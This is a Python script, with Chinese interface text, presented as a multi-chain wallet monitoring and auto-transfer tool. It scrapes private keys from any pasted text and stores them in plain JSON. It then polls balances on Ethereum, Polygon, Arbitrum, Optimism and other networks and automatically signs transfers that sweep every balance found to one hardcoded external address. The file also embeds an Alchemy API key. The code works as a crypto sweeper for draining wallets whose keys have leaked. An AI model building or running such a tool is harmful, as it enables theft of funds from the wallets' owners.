#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
钱包监控转账系统 v2.0
优化API速度和菜单交互体验
支持所有Alchemy EVM兼容链的钱包监控和自动转账
"""

import os
import sys
import json
import asyncio
import time
import re
from datetime import datetime
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
import concurrent.futures

# 自动安装依赖
def auto_install_dependencies():
    """自动检测并安装缺少的依赖"""
    required_packages = {
        'web3': 'web3',
        'eth_account': 'eth-account',
        'alchemy': 'alchemy-sdk',
        'colorama': 'colorama',
        'aiohttp': 'aiohttp',
        'cryptography': 'cryptography',
        'dataclass_wizard': 'dataclass-wizard'
    }
    
    missing_packages = []
    for module_name, package_name in required_packages.items():
        try:
            __import__(module_name)
        except ImportError:
            missing_packages.append(package_name)
    
    if missing_packages:
        print(f"❌ 缺少必要的依赖包: {', '.join(missing_packages)}")
        print("💡 正在自动安装...")
        
        import subprocess
        for package in missing_packages:
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
                print(f"✅ {package} 安装成功")
            except:
                try:
                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--user', package])
                    print(f"✅ {package} 安装成功 (用户模式)")
                except:
                    print(f"❌ {package} 安装失败")
                    return False
    return True

# 确保依赖可用
if not auto_install_dependencies():
    print("❌ 依赖安装失败，请手动安装")
    sys.exit(1)

# 导入依赖
try:
    from web3 import Web3
    from eth_account import Account
    from alchemy import Alchemy, Network
    from colorama import Fore, Style, init
    import aiohttp
    import cryptography
    
    # 初始化colorama
    init(autoreset=True)
    
except ImportError as e:
    print(f"❌ 导入依赖失败: {e}")
    print("💡 请运行 wallet_monitor_launcher.py 来自动安装依赖")
    sys.exit(1)

# 配置
ALCHEMY_API_KEY = "S0hs4qoXIR1SMD8P7I6Wt"
TARGET_ADDRESS = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"

# 数据文件
WALLETS_FILE = "wallets.json"
MONITORING_LOG_FILE = "monitoring_log.json"
CONFIG_FILE = "config.json"
NETWORK_STATUS_FILE = "network_status.json"

# Alchemy支持的EVM兼容链 (优先主网)
SUPPORTED_NETWORKS = {
    "eth_mainnet": Network.ETH_MAINNET,
    "matic_mainnet": Network.MATIC_MAINNET,
    "arb_mainnet": Network.ARB_MAINNET,
    "opt_mainnet": Network.OPT_MAINNET,
    "eth_goerli": Network.ETH_GOERLI,
    "matic_mumbai": Network.MATIC_MUMBAI,
    "arb_goerli": Network.ARB_GOERLI,
    "opt_goerli": Network.OPT_GOERLI,
    "opt_kovan": Network.OPT_KOVAN,
    "astar_mainnet": Network.ASTAR_MAINNET,
}

# 网络名称映射
NETWORK_NAMES = {
    "eth_mainnet": "Ethereum 主网",
    "matic_mainnet": "Polygon 主网", 
    "arb_mainnet": "Arbitrum 主网",
    "opt_mainnet": "Optimism 主网",
    "eth_goerli": "Ethereum Goerli",
    "matic_mumbai": "Polygon Mumbai",
    "arb_goerli": "Arbitrum Goerli",
    "opt_goerli": "Optimism Goerli",
    "opt_kovan": "Optimism Kovan",
    "astar_mainnet": "Astar 主网",
}

@dataclass
class WalletInfo:
    """钱包信息"""
    address: str
    private_key: str
    enabled_networks: List[str]
    last_checked: Dict[str, str]

class WalletMonitor:
    """钱包监控器"""
    
    def __init__(self):
        self.wallets: List[WalletInfo] = []
        self.alchemy_clients: Dict[str, Alchemy] = {}
        self.monitoring_active = False
        self.network_status: Dict[str, bool] = {}
        self.load_wallets()
        self.load_network_status()
        
    def initialize_clients(self):
        """快速初始化Alchemy客户端"""
        print(f"\n{Fore.CYAN}🔧 快速初始化网络客户端...{Style.RESET_ALL}")
        
        def init_single_client(network_item):
            network_key, network = network_item
            try:
                client = Alchemy(api_key=ALCHEMY_API_KEY, network=network)
                # 快速连接测试
                return network_key, client, True
            except Exception as e:
                return network_key, None, False
        
        # 并发初始化所有客户端
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(init_single_client, item) for item in SUPPORTED_NETWORKS.items()]
            
            success_count = 0
            for future in concurrent.futures.as_completed(futures):
                network_key, client, success = future.result()
                if success:
                    self.alchemy_clients[network_key] = client
                    self.network_status[network_key] = True
                    print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]}{Style.RESET_ALL}")
                    success_count += 1
                else:
                    self.network_status[network_key] = False
                    print(f"{Fore.RED}❌ {NETWORK_NAMES[network_key]}{Style.RESET_ALL}")
        
        self.save_network_status()
        print(f"{Fore.GREEN}✅ 网络初始化完成 ({success_count}/{len(SUPPORTED_NETWORKS)}){Style.RESET_ALL}")
    
    def load_network_status(self):
        """加载网络状态缓存"""
        if os.path.exists(NETWORK_STATUS_FILE):
            try:
                with open(NETWORK_STATUS_FILE, 'r', encoding='utf-8') as f:
                    self.network_status = json.load(f)
            except:
                self.network_status = {}
    
    def save_network_status(self):
        """保存网络状态"""
        try:
            with open(NETWORK_STATUS_FILE, 'w', encoding='utf-8') as f:
                json.dump(self.network_status, f, ensure_ascii=False, indent=2)
        except:
            pass
    
    def load_wallets(self):
        """加载钱包数据"""
        if os.path.exists(WALLETS_FILE):
            try:
                with open(WALLETS_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    self.wallets = [WalletInfo(**wallet) for wallet in data]
            except Exception as e:
                print(f"{Fore.YELLOW}⚠️ 加载钱包数据失败: {e}{Style.RESET_ALL}")
                self.wallets = []
    
    def save_wallets(self):
        """保存钱包数据"""
        try:
            data = [wallet.__dict__ for wallet in self.wallets]
            with open(WALLETS_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"{Fore.RED}❌ 保存钱包数据失败: {e}{Style.RESET_ALL}")
    
    def extract_private_keys(self, text: str) -> List[str]:
        """智能提取私钥"""
        patterns = [
            r'0x[a-fA-F0-9]{64}',  # 带0x前缀的64位十六进制
            r'[a-fA-F0-9]{64}',    # 不带前缀的64位十六进制
        ]
        
        private_keys = []
        for pattern in patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                key = match.lower()
                if not key.startswith('0x'):
                    key = '0x' + key
                
                try:
                    Account.from_key(key)
                    if key not in private_keys:
                        private_keys.append(key)
                except:
                    continue
        
        return private_keys
    
    def print_progress_bar(self, current: int, total: int, prefix: str = "进度"):
        """显示进度条"""
        percent = int(100 * current / total)
        bar_length = 30
        filled_length = int(bar_length * current / total)
        bar = '█' * filled_length + '░' * (bar_length - filled_length)
        print(f"\r{Fore.CYAN}{prefix}: [{bar}] {percent}% ({current}/{total}){Style.RESET_ALL}", end='', flush=True)
    
    def import_private_keys_menu(self):
        """导入私钥菜单 - 优化交互"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}📥 智能批量导入私钥{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}💡 智能识别功能:{Style.RESET_ALL}")
        print("  ✓ 自动识别64位十六进制私钥")
        print("  ✓ 支持0x前缀和无前缀格式")
        print("  ✓ 从任意文本中提取私钥")
        print("  ✓ 自动去重和验证")
        
        print(f"\n{Fore.YELLOW}📋 操作说明:{Style.RESET_ALL}")
        print("  1️⃣ 粘贴包含私钥的文本")
        print("  2️⃣ 双击回车确认导入")
        print("  3️⃣ 输入 'q' 或 'quit' 返回主菜单")
        
        collected_text = ""
        empty_line_count = 0
        
        print(f"\n{Fore.CYAN}{'='*40}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}请粘贴私钥文本 (双击回车确认):{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*40}{Style.RESET_ALL}")
        
        while True:
            try:
                line = input()
                if line.strip().lower() in ['q', 'quit', 'exit']:
                    return
                
                if line.strip() == "":
                    empty_line_count += 1
                    if empty_line_count >= 2:
                        break
                else:
                    empty_line_count = 0
                    collected_text += line + "\n"
                    print(f"{Fore.GREEN}✓{Style.RESET_ALL}", end='', flush=True)
            except KeyboardInterrupt:
                return
        
        if not collected_text.strip():
            print(f"\n{Fore.YELLOW}⚠️ 未输入任何内容{Style.RESET_ALL}")
            input(f"{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}🔍 正在分析文本...{Style.RESET_ALL}")
        private_keys = self.extract_private_keys(collected_text)
        
        if not private_keys:
            print(f"{Fore.RED}❌ 未找到有效的私钥{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}💡 请确保私钥格式正确 (64位十六进制){Style.RESET_ALL}")
            input(f"{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}🎉 发现 {len(private_keys)} 个有效私钥!{Style.RESET_ALL}")
        
        # 处理进度显示
        new_wallets = []
        existing_addresses = {wallet.address.lower() for wallet in self.wallets}
        
        print(f"\n{Fore.CYAN}🔄 正在验证地址...{Style.RESET_ALL}")
        for i, private_key in enumerate(private_keys, 1):
            self.print_progress_bar(i, len(private_keys), "验证")
            try:
                account = Account.from_key(private_key)
                address = account.address
                
                if address.lower() not in existing_addresses:
                    wallet_info = WalletInfo(
                        address=address,
                        private_key=private_key,
                        enabled_networks=list(SUPPORTED_NETWORKS.keys()),
                        last_checked={}
                    )
                    new_wallets.append(wallet_info)
                    existing_addresses.add(address.lower())
            except Exception as e:
                continue
        
        print()  # 换行
        
        # 显示结果
        if new_wallets:
            print(f"\n{Fore.GREEN}📋 新钱包预览:{Style.RESET_ALL}")
            for i, wallet in enumerate(new_wallets, 1):
                print(f"  {i}. {wallet.address}")
            
            existing_count = len(private_keys) - len(new_wallets)
            if existing_count > 0:
                print(f"\n{Fore.YELLOW}💡 跳过 {existing_count} 个已存在的钱包{Style.RESET_ALL}")
            
            print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
            confirm = input(f"{Fore.CYAN}确认导入 {len(new_wallets)} 个新钱包? (y/N): {Style.RESET_ALL}")
            
            if confirm.lower() in ['y', 'yes']:
                self.wallets.extend(new_wallets)
                self.save_wallets()
                print(f"\n{Fore.GREEN}🎉 成功导入 {len(new_wallets)} 个钱包!{Style.RESET_ALL}")
                print(f"{Fore.GREEN}💼 当前总钱包数: {len(self.wallets)}{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.YELLOW}❌ 取消导入{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}💡 所有私钥对应的钱包都已存在{Style.RESET_ALL}")
        
        input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
    
    async def check_address_activity_fast(self, address: str, network_key: str) -> bool:
        """快速检查地址活动 - 优化版本"""
        if not self.network_status.get(network_key, True):
            return False
            
        try:
            client = self.alchemy_clients[network_key]
            
            # 使用超时控制
            async with asyncio.timeout(10):  # 10秒超时
                # 只检查最近的交易，减少API调用
                response = await client.core.get_asset_transfers(
                    from_address=address,
                    category=["external"],  # 只检查主要交易
                    max_count=1  # 只需要1条记录即可判断
                )
                
                if response and hasattr(response, 'transfers') and len(response.transfers) > 0:
                    return True
                    
                # 快速检查接收交易
                response = await client.core.get_asset_transfers(
                    to_address=address,
                    category=["external"],
                    max_count=1
                )
                
                return response and hasattr(response, 'transfers') and len(response.transfers) > 0
                
        except asyncio.TimeoutError:
            print(f"{Fore.YELLOW}⏰ {NETWORK_NAMES[network_key]} 检查超时{Style.RESET_ALL}")
            self.network_status[network_key] = False
            return False
        except Exception as e:
            if "403" in str(e) or "Forbidden" in str(e):
                print(f"{Fore.RED}🚫 {NETWORK_NAMES[network_key]} API访问被拒绝{Style.RESET_ALL}")
                self.network_status[network_key] = False
            elif "Name or service not known" in str(e):
                print(f"{Fore.YELLOW}🌐 {NETWORK_NAMES[network_key]} 网络不可达{Style.RESET_ALL}")
                self.network_status[network_key] = False
            else:
                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 检查失败{Style.RESET_ALL}")
            return False
    
    async def get_balance_fast(self, address: str, network_key: str) -> float:
        """快速获取余额"""
        if not self.network_status.get(network_key, True):
            return 0.0
            
        try:
            client = self.alchemy_clients[network_key]
            async with asyncio.timeout(5):  # 5秒超时
                balance_wei = await client.core.get_balance(address)
                balance_eth = Web3.from_wei(balance_wei, 'ether')
                return float(balance_eth)
        except asyncio.TimeoutError:
            self.network_status[network_key] = False
            return 0.0
        except Exception as e:
            return 0.0
    
    async def transfer_balance(self, wallet: WalletInfo, network_key: str, balance: float) -> bool:
        """转移余额到目标地址"""
        try:
            client = self.alchemy_clients[network_key]
            w3 = Web3()
            
            # 创建账户
            account = Account.from_key(wallet.private_key)
            
            # 获取nonce
            nonce = await client.core.get_transaction_count(wallet.address)
            
            # 获取gas价格
            gas_price = await client.core.get_gas_price()
            
            # 估算gas费用
            gas_limit = 21000  # 标准转账
            gas_cost = gas_price * gas_limit
            
            # 计算实际转账金额
            balance_wei = Web3.to_wei(balance, 'ether')
            transfer_amount = balance_wei - gas_cost
            
            if transfer_amount <= 0:
                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 余额不足支付gas费{Style.RESET_ALL}")
                return False
            
            # 构建交易
            transaction = {
                'to': TARGET_ADDRESS,
                'value': transfer_amount,
                'gas': gas_limit,
                'gasPrice': gas_price,
                'nonce': nonce,
            }
            
            # 签名交易
            signed_txn = account.sign_transaction(transaction)
            
            # 发送交易
            tx_hash = await client.core.send_raw_transaction(signed_txn.rawTransaction)
            
            # 记录转账
            log_entry = {
                'timestamp': datetime.now().isoformat(),
                'from_address': wallet.address,
                'to_address': TARGET_ADDRESS,
                'amount': Web3.from_wei(transfer_amount, 'ether'),
                'network': network_key,
                'tx_hash': tx_hash.hex(),
                'gas_used': gas_cost
            }
            
            self.log_transfer(log_entry)
            
            print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} 转账成功: {Web3.from_wei(transfer_amount, 'ether'):.6f} ETH{Style.RESET_ALL}")
            print(f"{Fore.CYAN}📋 交易哈希: {tx_hash.hex()}{Style.RESET_ALL}")
            
            return True
            
        except Exception as e:
            print(f"{Fore.RED}❌ {NETWORK_NAMES[network_key]} 转账失败: {e}{Style.RESET_ALL}")
            return False
    
    def log_transfer(self, log_entry: Dict):
        """记录转账日志"""
        logs = []
        if os.path.exists(MONITORING_LOG_FILE):
            try:
                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
            except:
                logs = []
        
        logs.append(log_entry)
        
        try:
            with open(MONITORING_LOG_FILE, 'w', encoding='utf-8') as f:
                json.dump(logs, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"{Fore.RED}❌ 保存转账日志失败: {e}{Style.RESET_ALL}")
    
    async def monitor_wallet_optimized(self, wallet: WalletInfo):
        """优化的钱包监控"""
        print(f"\n{Fore.CYAN}🔍 检查钱包: {wallet.address[:10]}...{wallet.address[-6:]}{Style.RESET_ALL}")
        
        # 并发检查所有网络活动
        active_networks = []
        available_networks = [net for net in wallet.enabled_networks if self.network_status.get(net, True)]
        
        if not available_networks:
            print(f"{Fore.YELLOW}⚠️ 没有可用的网络{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}📡 并发检查 {len(available_networks)} 个网络...{Style.RESET_ALL}")
        
        # 并发检查活动
        async def check_network(network_key):
            has_activity = await self.check_address_activity_fast(wallet.address, network_key)
            if has_activity:
                return network_key
            return None
        
        # 限制并发数
        semaphore = asyncio.Semaphore(3)  # 最多3个并发请求
        
        async def check_with_semaphore(network_key):
            async with semaphore:
                return await check_network(network_key)
        
        tasks = [check_with_semaphore(net) for net in available_networks]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for i, result in enumerate(results):
            network_key = available_networks[i]
            if result and not isinstance(result, Exception):
                active_networks.append(result)
                print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 跳过{Style.RESET_ALL}")
        
        if not active_networks:
            print(f"{Fore.YELLOW}💡 钱包无活动记录{Style.RESET_ALL}")
            return
        
        print(f"{Fore.GREEN}🎯 监控 {len(active_networks)} 个活跃网络{Style.RESET_ALL}")
        
        # 监控余额
        while self.monitoring_active:
            for network_key in active_networks:
                try:
                    balance = await self.get_balance_fast(wallet.address, network_key)
                    
                    if balance > 0:
                        print(f"\n{Fore.GREEN}💰 发现余额!{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}📍 地址: {wallet.address}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}🌐 网络: {NETWORK_NAMES[network_key]}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}💵 余额: {balance:.6f} ETH{Style.RESET_ALL}")
                        
                        # 自动转账
                        success = await self.transfer_balance(wallet, network_key, balance)
                        if success:
                            print(f"{Fore.GREEN}🎉 自动转账完成!{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.RED}❌ 自动转账失败{Style.RESET_ALL}")
                
                except Exception as e:
                    continue
            
            # 等待下次检查
            await asyncio.sleep(30)
    
    async def start_monitoring(self):
        """开始监控所有钱包 - 优化版本"""
        if not self.wallets:
            print(f"{Fore.RED}❌ 没有导入的钱包{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}🎯 开始监控 {len(self.wallets)} 个钱包{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🎯 目标地址: {TARGET_ADDRESS}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 按 Ctrl+C 停止监控{Style.RESET_ALL}")
        
        self.monitoring_active = True
        
        # 限制并发监控数量，避免API限制
        semaphore = asyncio.Semaphore(2)  # 最多2个钱包并发监控
        
        async def monitor_with_semaphore(wallet):
            async with semaphore:
                await self.monitor_wallet_optimized(wallet)
        
        tasks = [monitor_with_semaphore(wallet) for wallet in self.wallets]
        
        try:
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⚠️ 监控已停止{Style.RESET_ALL}")
        finally:
            self.monitoring_active = False
    
    def start_monitoring_menu(self):
        """开始监控菜单 - 优化交互"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        if not self.wallets:
            print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}🎯 开始监控{Style.RESET_ALL}")
            print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
            print(f"\n{Fore.RED}❌ 还没有导入任何钱包私钥{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}💡 请先使用功能1导入私钥{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
            return
        
        print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}🎯 智能监控系统{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
        
        # 显示监控概览
        available_networks = sum(1 for status in self.network_status.values() if status)
        
        print(f"\n{Fore.GREEN}📊 监控概览:{Style.RESET_ALL}")
        print(f"  💼 钱包数量: {len(self.wallets)}")
        print(f"  🌐 可用网络: {available_networks}/{len(SUPPORTED_NETWORKS)}")
        print(f"  🎯 目标地址: {TARGET_ADDRESS[:10]}...{TARGET_ADDRESS[-6:]}")
        
        print(f"\n{Fore.YELLOW}⚡ 优化特性:{Style.RESET_ALL}")
        print("  ✓ 并发网络检查 (3倍速度提升)")
        print("  ✓ 智能超时控制 (避免卡死)")
        print("  ✓ 自动跳过无效网络")
        print("  ✓ 实时进度显示")
        
        print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        confirm = input(f"{Fore.CYAN}确认开始智能监控? (y/N): {Style.RESET_ALL}")
        
        if confirm.lower() in ['y', 'yes']:
            try:
                print(f"\n{Fore.GREEN}🚀 启动智能监控系统...{Style.RESET_ALL}")
                asyncio.run(self.start_monitoring())
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}⚠️ 监控已停止{Style.RESET_ALL}")
            except Exception as e:
                print(f"\n{Fore.RED}❌ 监控出错: {e}{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}❌ 取消监控{Style.RESET_ALL}")
        
        input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
    
    def show_status(self):
        """显示系统状态 - 简洁版"""
        print(f"\n{Fore.YELLOW}📊 系统状态{Style.RESET_ALL}")
        print("="*50)
        
        # 钱包状态
        wallet_status = f"💼 钱包: {len(self.wallets)} 个"
        if len(self.wallets) > 0:
            wallet_status += f" (最新: {self.wallets[-1].address[:10]}...)"
        print(wallet_status)
        
        # 网络状态
        available_count = sum(1 for status in self.network_status.values() if status)
        network_status = f"🌐 网络: {available_count}/{len(SUPPORTED_NETWORKS)} 可用"
        print(network_status)
        
        # 转账记录
        transfer_count = 0
        if os.path.exists(MONITORING_LOG_FILE):
            try:
                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
                transfer_count = len(logs)
            except:
                pass
        print(f"📋 转账: {transfer_count} 笔")
        
        # 目标地址
        print(f"🎯 目标: {TARGET_ADDRESS[:10]}...{TARGET_ADDRESS[-6:]}")
    
    def show_detailed_status(self):
        """显示详细状态 - 优化版本"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}📊 详细系统状态 & 网络诊断{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
        
        # 网络状态详情
        print(f"\n{Fore.YELLOW}🌐 网络连接状态:{Style.RESET_ALL}")
        available_networks = []
        unavailable_networks = []
        
        for network_key in SUPPORTED_NETWORKS.keys():
            status = self.network_status.get(network_key, True)
            if status and network_key in self.alchemy_clients:
                available_networks.append(network_key)
                print(f"  🟢 {NETWORK_NAMES[network_key]}")
            else:
                unavailable_networks.append(network_key)
                print(f"  🔴 {NETWORK_NAMES[network_key]} (不可用)")
        
        print(f"\n{Fore.GREEN}✅ 可用网络: {len(available_networks)} 个{Style.RESET_ALL}")
        if unavailable_networks:
            print(f"{Fore.RED}❌ 不可用网络: {len(unavailable_networks)} 个{Style.RESET_ALL}")
        
        # 钱包详情
        print(f"\n{Fore.YELLOW}💼 钱包管理:{Style.RESET_ALL}")
        if not self.wallets:
            print("  📭 暂无导入的钱包")
            print(f"  {Fore.CYAN}💡 使用功能1导入私钥{Style.RESET_ALL}")
        else:
            print(f"  📊 总数量: {len(self.wallets)} 个")
            print(f"  📋 钱包列表:")
            for i, wallet in enumerate(self.wallets, 1):
                short_addr = f"{wallet.address[:10]}...{wallet.address[-6:]}"
                print(f"    {i}. {short_addr}")
        
        # 转账历史
        print(f"\n{Fore.YELLOW}📋 转账历史:{Style.RESET_ALL}")
        if os.path.exists(MONITORING_LOG_FILE):
            try:
                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
                if logs:
                    print(f"  📊 总转账: {len(logs)} 笔")
                    total_amount = sum(float(log.get('amount', 0)) for log in logs)
                    print(f"  💰 总金额: {total_amount:.6f} ETH")
                    
                    # 显示最近3笔
                    recent_logs = logs[-3:] if len(logs) > 3 else logs
                    print(f"  📝 最近转账:")
                    for log in recent_logs:
                        time_str = log['timestamp'][:16].replace('T', ' ')
                        network_name = NETWORK_NAMES.get(log['network'], log['network'])
                        print(f"    • {time_str} | {network_name} | {log['amount']:.6f} ETH")
                else:
                    print("  📭 暂无转账记录")
            except:
                print("  ❌ 转账记录读取失败")
        else:
            print("  📭 暂无转账记录")
        
        # 系统配置
        print(f"\n{Fore.YELLOW}⚙️ 系统配置:{Style.RESET_ALL}")
        print(f"  🎯 目标地址: {TARGET_ADDRESS}")
        print(f"  🔑 API密钥: {ALCHEMY_API_KEY[:15]}...")
        print(f"  🔄 监控状态: {'🟢 运行中' if self.monitoring_active else '🔴 已停止'}")
        print(f"  ⚡ 检查间隔: 30秒")
    
    def show_help_menu(self):
        """显示帮助菜单"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}📖 使用帮助 & 常见问题{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}🚀 快速开始:{Style.RESET_ALL}")
        print("  1️⃣ 导入私钥 → 粘贴私钥文本 → 双击回车")
        print("  2️⃣ 开始监控 → 确认开始 → 自动转账")
        print("  3️⃣ 查看状态 → 检查钱包和网络状态")
        
        print(f"\n{Fore.YELLOW}💡 私钥导入技巧:{Style.RESET_ALL}")
        print("  • 支持任意格式文本，自动提取私钥")
        print("  • 支持批量导入，自动去重")
        print("  • 支持0x前缀和无前缀格式")
        print("  • 输入 'q' 快速返回主菜单")
        
        print(f"\n{Fore.CYAN}⚡ 性能优化:{Style.RESET_ALL}")
        print("  • 并发网络检查，3倍速度提升")
        print("  • 智能超时控制，避免卡死")
        print("  • 自动跳过无效网络")
        print("  • 缓存网络状态，减少重复检查")
        
        print(f"\n{Fore.RED}🛡️ 安全提醒:{Style.RESET_ALL}")
        print("  • 私钥本地存储，请保护好文件")
        print("  • 监控过程中保持网络连接")
        print("  • 建议在服务器上运行")
        
        print(f"\n{Fore.YELLOW}🔧 故障排除:{Style.RESET_ALL}")
        print("  • 网络错误: 检查网络连接和API密钥")
        print("  • 导入失败: 确认私钥格式正确")
        print("  • 监控卡死: 重启程序，会自动恢复")
    
    def main_menu(self):
        """主菜单 - 全面优化的交互体验"""
        while True:
            # 清屏，避免菜单堆叠
            os.system('clear' if os.name == 'posix' else 'cls')
            
            print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}🔐 钱包监控转账系统 v2.0 - 智能优化版{Style.RESET_ALL}")
            print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
            
            self.show_status()
            
            print(f"\n{Fore.YELLOW}📋 功能菜单:{Style.RESET_ALL}")
            print(f"  {Fore.CYAN}1.{Style.RESET_ALL} 📥 导入私钥    {Fore.GREEN}(智能批量识别){Style.RESET_ALL}")
            print(f"  {Fore.CYAN}2.{Style.RESET_ALL} 🎯 开始监控    {Fore.GREEN}(并发优化){Style.RESET_ALL}")
            print(f"  {Fore.CYAN}3.{Style.RESET_ALL} 📊 详细状态    {Fore.GREEN}(网络诊断){Style.RESET_ALL}")
            print(f"  {Fore.CYAN}4.{Style.RESET_ALL} 📖 使用帮助    {Fore.GREEN}(操作指南){Style.RESET_ALL}")
            print(f"  {Fore.CYAN}5.{Style.RESET_ALL} 🚪 退出程序")
            
            print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
            
            try:
                choice = input(f"{Fore.CYAN}请选择功能 (1-5): {Style.RESET_ALL}").strip()
                
                if choice == "1":
                    self.import_private_keys_menu()
                elif choice == "2":
                    self.start_monitoring_menu()
                elif choice == "3":
                    self.show_detailed_status()
                    input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
                elif choice == "4":
                    self.show_help_menu()
                    input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
                elif choice == "5":
                    print(f"\n{Fore.GREEN}👋 感谢使用钱包监控系统！{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}💡 数据已保存，下次启动会自动恢复{Style.RESET_ALL}")
                    break
                else:
                    print(f"\n{Fore.RED}❌ 无效选择，请输入 1-5{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}💡 提示: 输入对应数字选择功能{Style.RESET_ALL}")
                    time.sleep(2)
                    
            except KeyboardInterrupt:
                print(f"\n\n{Fore.GREEN}👋 感谢使用钱包监控系统！{Style.RESET_ALL}")
                break
            except Exception as e:
                print(f"\n{Fore.RED}❌ 发生错误: {e}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}💡 程序将在3秒后继续...{Style.RESET_ALL}")
                time.sleep(3)

def main():
    """主函数"""
    try:
        monitor = WalletMonitor()
        monitor.initialize_clients()
        monitor.main_menu()
    except Exception as e:
        print(f"{Fore.RED}❌ 系统启动失败: {e}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()
